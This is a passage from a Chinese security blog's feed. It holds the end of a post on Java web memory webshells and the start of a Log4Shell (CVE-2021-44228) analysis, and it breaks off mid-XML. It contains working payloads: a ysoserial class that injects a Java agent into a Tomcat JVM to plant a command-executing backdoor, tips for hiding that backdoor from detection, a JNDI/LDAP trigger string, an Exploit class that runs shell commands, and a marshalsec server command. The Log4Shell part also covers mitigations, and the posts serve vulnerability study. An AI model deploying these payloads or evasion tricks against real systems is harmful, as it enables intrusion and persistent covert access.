class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Java-Agent内存马"><a href="#Java-Agent内存马" class="headerlink" title="Java Agent内存马"></a>Java Agent内存马</h2><blockquote><p>参考：<a href="https://xz.aliyun.com/t/9450">Java Agent 从入门到内存马 - 先知社区 (aliyun.com)</a></p></blockquote><p>还是以Tomcat为例，我们知道JavaAgent技术可以动态修改字节码，我们熟知的Burp Suite的破解技术就是基于<code>premain</code>方法实现的，通过<code>agentmain</code>，我们可以直接修改关键类即可</p><p>由于Java Agent内存马需要有Jar文件落地，并不是比JSP更好的方法，只能说在JSP无法解析的时候适用性会更好一些</p><p>比较知名的冰蝎就提供了Java Agent内存马，我们也实现一个比较基础的</p><p>调用端(Attacher)的核心代码其实就3句话</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">VirtualMachine virtualMachine = VirtualMachine.attach(id);</span><br><span class="line">virtualMachine.loadAgent(jarName);</span><br><span class="line">virtualMachine.detach();</span><br></pre></td></tr></table></figure><p>我们可以使用前面研究过的JNDI注入方法进行注入，也可以利用反序列化，只要能够执行Java代码即可，甚至拿到系统Shell后直接用命令执行<code>loadAgent</code>的另一个java程序也可以，只是要上传更多的文件，风险更大</p><p>这里方便起见，直接继续使用前面研究的反序列化注入方法进行攻击，我们在<code>shells</code>中增加一个新的Payload，代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.shells;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> com.sun.tools.attach.VirtualMachine;</span><br><span class="line"><span class="keyword">import</span> sun.management.VMManagement;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.management.ManagementFactory;</span><br><span class="line"><span class="keyword">import</span> java.lang.management.RuntimeMXBean;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentInjection</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 首先获取进程ID</span></span><br><span class="line">            RuntimeMXBean runtime = ManagementFactory.getRuntimeMXBean();</span><br><span class="line">            Field jvm = runtime.getClass().getDeclaredField(<span class="string">&quot;jvm&quot;</span>);</span><br><span class="line">            jvm.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            VMManagement mgmt = (VMManagement) jvm.get(runtime);</span><br><span class="line">            Method pidMethod = mgmt.getClass().getDeclaredMethod(<span class="string">&quot;getProcessId&quot;</span>);</span><br><span class="line">            pidMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            <span class="comment">// attach到当前JVM</span></span><br><span class="line">            VirtualMachine virtualMachine = VirtualMachine.attach(String.valueOf(pidMethod.invoke(mgmt)));</span><br><span class="line">            <span class="comment">// 加载agent，可以从远程下载再load，这里直接从本地load了</span></span><br><span class="line">            virtualMachine.loadAgent(<span class="string">&quot;/tmp/agent.jar&quot;</span>);</span><br><span class="line">            virtualMachine.detach();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>src/main/resources/</code>目录下创建<code>META-INF/MANIFEST.MF</code>，内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Manifest-Version: 1.0</span><br><span class="line">Agent-Class: Agent</span><br><span class="line">Can-Retransform-Classes: true</span><br></pre></td></tr></table></figure><p>打包成<code>.jar</code>，发送序列化数据，结果遇到异常</p><p><img src="../../img/JavaWeb-%E5%86%85%E5%AD%98%E9%A9%AC%E6%8A%80%E6%9C%AF%E6%95%B4%E7%90%86/image-20220126195048536.png" alt="image-20220126195048536"></p><p>可以发现依赖于<code>tools.jar</code>，这个包对于Tomcat来说并不会自动加载，为了让攻击奏效，我们可以通过<code>JAVA_HOME</code>路径手动加载类型，通过反射执行相关函数</p><p>修改后的Payload代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.shells;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"><span class="keyword">import</span> sun.management.VMManagement;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.lang.management.ManagementFactory;</span><br><span class="line"><span class="keyword">import</span> java.lang.management.RuntimeMXBean;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AgentInjection</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 首先获取进程ID</span></span><br><span class="line">            RuntimeMXBean runtime = ManagementFactory.getRuntimeMXBean();</span><br><span class="line">            Field jvm = runtime.getClass().getDeclaredField(<span class="string">&quot;jvm&quot;</span>);</span><br><span class="line">            jvm.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            VMManagement mgmt = (VMManagement) jvm.get(runtime);</span><br><span class="line">            Method pidMethod = mgmt.getClass().getDeclaredMethod(<span class="string">&quot;getProcessId&quot;</span>);</span><br><span class="line">            pidMethod.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            <span class="comment">// 通过反射进行调用</span></span><br><span class="line">            URLClassLoader classLoader = <span class="keyword">new</span> java.net.URLClassLoader(<span class="keyword">new</span> java.net.URL[]&#123;<span class="keyword">new</span> File(System.getProperty(<span class="string">&quot;java.home&quot;</span>).replace(<span class="string">&quot;jre&quot;</span>,<span class="string">&quot;lib&quot;</span>) + File.separator + <span class="string">&quot;tools.jar&quot;</span>).toURI().toURL()&#125;);</span><br><span class="line">            Class&lt;?&gt; VirtualMachine = classLoader.loadClass(<span class="string">&quot;com.sun.tools.attach.VirtualMachine&quot;</span>);</span><br><span class="line">            Method attach = VirtualMachine.getDeclaredMethod(<span class="string">&quot;attach&quot;</span>,<span class="keyword">new</span> Class[]&#123;java.lang.String.class&#125;);</span><br><span class="line">            Method loadAgent=VirtualMachine.getDeclaredMethod(<span class="string">&quot;loadAgent&quot;</span>,<span class="keyword">new</span> Class[]&#123;java.lang.String.class&#125;);</span><br><span class="line">            Method detach=VirtualMachine.getDeclaredMethod(<span class="string">&quot;detach&quot;</span>,<span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">            Object virtualMachine = attach.invoke(VirtualMachine,<span class="keyword">new</span> Object[]&#123;String.valueOf(pidMethod.invoke(mgmt))&#125;);</span><br><span class="line">            loadAgent.invoke(virtualMachine,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;/tmp/agent.jar&quot;</span>&#125;);</span><br><span class="line">            detach.invoke(virtualMachine);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>完成反序列化注入Payload后，在访问任意路径时，带上GET参数<code>admin</code>就可以执行命令了</p><h2 id="内存马检测和隐藏"><a href="#内存马检测和隐藏" class="headerlink" title="内存马检测和隐藏"></a>内存马检测和隐藏</h2><blockquote><p>参考：</p><p><a href="https://xz.aliyun.com/t/10562">探索Filter型Tomcat内存马的免杀 - 先知社区 (aliyun.com)</a></p><p><a href="https://gv7.me/articles/2020/kill-java-web-filter-memshell/">查杀Java web filter型内存马 | 回忆飘如雪 (gv7.me)</a></p></blockquote><p>对于注入后的内存马，可以分为两个类型</p><ul><li>组件注入型 - 注入Servlet、Filter、Listener、Controller等</li><li>Agent注入型 - 注入字节码</li></ul><p>检测方面的研究主要有c0ny1师傅的文章</p><h3 id="组件注入型的检测和查杀"><a href="#组件注入型的检测和查杀" class="headerlink" title="组件注入型的检测和查杀"></a>组件注入型的检测和查杀</h3><p>可以发现c0ny1师傅给出的方法就是通过加载Java Agent实时获取所有Filter，并且对于可疑的类进行检查</p><p>根据4ra1n师傅的方法，我们可以主要通过如下手段来隐藏我们的内存马</p><ol><li>内存马的类名改为更加合理的，不要使用<code>BackdoorFilter</code>这样显眼的名字，并引入一定的随机化</li><li>读取已有Filter的包名，将自己Filter包名改为一致的</li><li>自动修改<code>web.xml</code>的内容进行隐藏</li></ol><p>除此之外，由于可以检查Filter对应的classpath是否存在来检查，我们可以把class文件写入到硬盘上，但是这样就有被HIDS扫描到的风险，应视情况采用</p><p>目前为止，如果防御方不把class文件dump出来进行反编译对源码进行分析，应该是很难识别了，如果被dump了的话，只能进一步进采用源码免杀技巧</p><h3 id="Agent注入型的检测和查杀"><a href="#Agent注入型的检测和查杀" class="headerlink" title="Agent注入型的检测和查杀"></a>Agent注入型的检测和查杀</h3><p>由于c0ny1师傅的《查杀Java web Agent型内存马》尚未发布，先留个坑在这里</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;本文以Tomcat 9为核心学习并归纳了一些内存马技术，除有特殊说明外的章节外，本文使用Java 8u292&lt;/p&gt;</summary>
    
    
    
    <category term="技术归纳" scheme="https://cn.4xpl0r3r.com/categories/%E6%8A%80%E6%9C%AF%E5%BD%92%E7%BA%B3/"/>
    
    
    <category term="Tomcat" scheme="https://cn.4xpl0r3r.com/tags/Tomcat/"/>
    
    <category term="JNDI" scheme="https://cn.4xpl0r3r.com/tags/JNDI/"/>
    
    <category term="Java Web" scheme="https://cn.4xpl0r3r.com/tags/Java-Web/"/>
    
    <category term="内存马" scheme="https://cn.4xpl0r3r.com/tags/%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    
    <category term="Shell" scheme="https://cn.4xpl0r3r.com/tags/Shell/"/>
    
    <category term="ysoserial" scheme="https://cn.4xpl0r3r.com/tags/ysoserial/"/>
    
    <category term="Java Agent" scheme="https://cn.4xpl0r3r.com/tags/Java-Agent/"/>
    
    <category term="恶意代码检测与隐藏" scheme="https://cn.4xpl0r3r.com/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%9A%90%E8%97%8F/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2021-44228 log4j2 RCE 分析</title>
    <link href="https://cn.4xpl0r3r.com/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2021-44228-log4j2-RCE-%E5%88%86%E6%9E%90/"/>
    <id>https://cn.4xpl0r3r.com/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/CVE-2021-44228-log4j2-RCE-%E5%88%86%E6%9E%90/</id>
    <published>2022-01-19T13:06:00.000Z</published>
    <updated>2022-02-13T11:45:09.574Z</updated>
    
    <content type="html"><![CDATA[<p>使用Java 8u181</p><span id="more"></span><article class="message message-immersive is-primary"><div class="message-body"><i class="fas fa-globe-americas mr-2"></i>本文同时提供以下语言的翻译：<a href="https://4xpl0r3r.com/Vuln-Analysis/Vulnerability-Analysis-CVE-2021-44228-Log4Shell/">English</a>.</div></article><h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>Apache Log4j2是一个基于Java的日志记录工具。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，经阿里云安全团队验证，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。</p><p>漏洞适用版本为2.0 &lt;= Apache log4j2 &lt;= 2.14.1，只需检测Java应用是否引入log4j-core这个jar。若存在应用使用，极大可能会受到影响。</p><h2 id="Exploit-复现"><a href="#Exploit-复现" class="headerlink" title="Exploit 复现"></a>Exploit 复现</h2><h3 id="漏洞复现代码"><a href="#漏洞复现代码" class="headerlink" title="漏洞复现代码"></a>漏洞复现代码</h3><p>采用Maven构建Trigger项目</p><p>引入<code>org.apache.logging.log4j</code>  版本<code>2.14.1</code>包</p><p>触发代码，只要logger使用了可记录等级进行记录，就会触发漏洞</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Logger logger = LogManager.getLogger();</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://ip:1389/#Exploit&#125;123&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="JNDI-Payload-代码"><a href="#JNDI-Payload-代码" class="headerlink" title="JNDI Payload 代码"></a>JNDI Payload 代码</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"><span class="keyword">import</span> java.io.Reader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> <span class="keyword">throws</span> IOException,InterruptedException</span>&#123;</span><br><span class="line">        String cmd=<span class="string">&quot;curl 127.0.0.1:5555&quot;</span>;</span><br><span class="line">        <span class="keyword">final</span> Process process = Runtime.getRuntime().exec(cmd);</span><br><span class="line">        printMessage(process.getInputStream());;</span><br><span class="line">        printMessage(process.getErrorStream());</span><br><span class="line">        <span class="keyword">int</span> value=process.waitFor();</span><br><span class="line">        System.out.println(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">printMessage</span><span class="params">(<span class="keyword">final</span> InputStream input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread (<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                <span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">                Reader reader =<span class="keyword">new</span> InputStreamReader(input);</span><br><span class="line">                BufferedReader bf = <span class="keyword">new</span> BufferedReader(reader);</span><br><span class="line">                String line = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="keyword">while</span> ((line=bf.readLine())!=<span class="keyword">null</span>)</span><br><span class="line">                    &#123;</span><br><span class="line">                        System.out.println(line);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;<span class="keyword">catch</span> (IOException  e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译这段代码以便后续的JNDI调用使用，触发构造方法执行命令</p><h3 id="漏洞触发"><a href="#漏洞触发" class="headerlink" title="漏洞触发"></a>漏洞触发</h3><p>典型的使用JNDI进行触发</p><p>首先在class文件处开启HTTP服务</p><p>然后利用marshalsec开启LDAP服务</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8080/<span class="comment">#Exploit</span></span><br></pre></td></tr></table></figure><p>运行main函数，成功触发</p><h2 id="漏洞原理分析"><a href="#漏洞原理分析" class="headerlink" title="漏洞原理分析"></a>漏洞原理分析</h2><h3 id="代码利用链分析"><a href="#代码利用链分析" class="headerlink" title="代码利用链分析"></a>代码利用链分析</h3><p>由于我们知道是JNDI注入，因此在<code>javax.naming.InitialContext</code>的构造方法处下断点</p><p>文件位于<code>rt.jar/javax/naming/InitialContext.java</code></p><p>成功抓到断点</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220116165713751.png" alt="image-20220116165713751"></p><p>调用栈信息如下</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220116165748332.png" alt="image-20220116165748332"></p><p>我们知道要触发JNDI漏洞必须要通过lookup函数，从<code>JndiLookup.lookup</code>函数向上回溯</p><p>我们往Payload加入一些杂物，看看什么时候聚焦到payload <code>$&#123;jndi:ldap://127.0.0.1:1389/#Exploit&#125;</code></p><p>可以发现<code>substitute</code>会将payload <code>AAAAA$&#123;jndi:ldap://127.0.0.1:1389/#Exploit&#125;BBBBB</code>解引用变成JNDI URI<code>ldap://127.0.0.1:1389/#Exploit</code></p><p>除此之外，我们可以发现<code>resolveVariable</code>用于处理使用<code>$&#123;&#125;</code>包裹的变量</p><p>再继续往上回溯，可以发现如下一段代码</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220116170645443.png" alt="image-20220116170645443"></p><p>可以发现只要遇到<code>$&#123;</code>则开始调用StrSubstuitutor的replace方法进行解析</p><h3 id="漏洞深入分析"><a href="#漏洞深入分析" class="headerlink" title="漏洞深入分析"></a>漏洞深入分析</h3><p>log4j2的三大组件</p><ul><li>Logger 日志记录器</li><li>Appender 日志输出</li><li>Layout 日志格式化</li></ul><p>继续分析前面得到的调用栈，可以发现</p><p>在log4j2中通过<code>LoggerConfig.processLogEvent()</code>处理日志事件，主要部分在调用<code>callAppenders()</code>即调用Appender</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220116172122778.png" alt="image-20220116172122778"></p><p>Appender功能主要是负责将日志事件传递到其目标，常用的Appender有ConsoleAppender（输出到控制台）、FileAppender（输出到本地文件）等，通过AppenderControl获取具体的Appender，本次调试的是ConsoleAppender。</p><p>Appender调用Layout获取日志格式，通过<code>Layout.encode()</code>进行日志的格式化</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220116172221859.png" alt="image-20220116172221859"></p><p> Layout会获取formatters来完成具体的格式化</p><p>处理传入的message通过<code>MessagePatternConverter.format()</code>，也是本次漏洞的关键之处。当config存在并且noLookups为false，匹配到<code>$&#123;&#39;</code>则调用<code>workingBuilder.append()</code>获取StrSubstitutor内容来替换原来的信息。</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220116170645443.png" alt="image-20220116170645443"></p><p>可以发现此处有个noLookups，是一个配置值，默认为false，之后我们研究下如何利用它进行防御</p><p>再往前看，然后是<code>StrSubstitutor.resolveVariable()</code>进行解析，可以发现支持这些协议</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220116173400517.png" alt="image-20220116173400517"></p><p>其中就包含了JNDI</p><h3 id="安全缓解措施-利用系统配置禁止LookUp"><a href="#安全缓解措施-利用系统配置禁止LookUp" class="headerlink" title="安全缓解措施 - 利用系统配置禁止LookUp"></a>安全缓解措施 - 利用系统配置禁止LookUp</h3><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220116170645443.png" alt="image-20220116170645443"></p><p>noLookups通过交叉引用可以找到</p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220116172659445.png" alt="image-20220116172659445"></p><p><img src="../../img/CVE-2021-44228%20log4j2%20RCE%20%E5%88%86%E6%9E%90/image-20220116172735690.png" alt="image-20220116172735690"></p><p>这里先一种最简单的——直接代码增加配置</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">import</span> java.lang.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.setProperty(<span class="string">&quot;log4j2.formatMsgNoLookups&quot;</span>,<span class="string">&quot;true&quot;</span>);</span><br><span class="line">        <span class="keyword">final</span> Logger logger = LogManager.getLogger();</span><br><span class="line">        logger.error(<span class="string">&quot;AAAAA$&#123;jndi:ldap://127.0.0.1:1389/#Exploit&#125;BBBBBB&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再次运行，可以发现不会对<code>$&#123;jndi:ldap://127.0.0.1:1389/#Exploit&#125;</code>进行解析</p><p>除此之外，也可以通过properties文件或命令行进行配置</p><h3 id="安全缓解措施-通过log4j2的配置文件禁止LookUp"><a href="#安全缓解措施-通过log4j2的配置文件禁止LookUp" class="headerlink" title="安全缓解措施 - 通过log4j2的配置文件禁止LookUp"></a>安全缓解措施 - 通过log4j2的配置文件禁止LookUp</h3><blockquote><p>我认为这是除了升级外最好的方法</p><p>参考官方文档：<a href="https://logging.apache.org/log4j/2.x/manual/configuration.html">Log4j – Configuring Log4j 2 (apache.org)</a></p></blockquote><p>除了XML还支持其它格式，以XML为例，在resource中创建<code>log4j2.xml</code>，一个能禁止LookUp的最小可用配置如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span 